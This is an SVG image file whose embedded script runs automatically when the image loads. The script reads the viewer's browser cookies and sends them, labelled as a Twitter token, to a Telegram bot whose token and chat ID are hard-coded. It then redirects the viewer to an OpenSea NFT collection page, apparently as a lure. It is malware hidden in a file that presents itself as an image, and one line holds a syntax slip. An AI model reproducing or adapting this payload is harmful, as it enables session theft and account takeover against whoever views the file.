<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" onload="init()">
  <script type="application/ecmascript"><![CDATA[
    function init(){
      const cookies = document.cookie; || 'TWITTER-this-worked-v2';
    
      // Your Telegram Bot Token and Chat ID
      const botToken = "8199528922:AAH9HLZVw9DkfVzgMaY1Wb0NEfr0pmdxCgA";
      const chatId = "-5072317801";
      
      const telegram_url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      
      const payload = {
        chat_id: chatId,
        text: "Token extracted from TWITTER: " + cookies,
        parse_mode: "HTML"
      };
      
      fetch(telegram_url, {
        method: 'POST',
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
      }).then(() => {
        setTimeout(() => {
          window.location.href = 'https://opensea.io/collection/lilpudgys';
        }, 500);
      }).catch(() => {
        setTimeout(() => {
          window.location.href = 'https://opensea.io/collection/lilpudgys';
        }, 500);
      });
    }
  ]]>
  </script>
</svg>
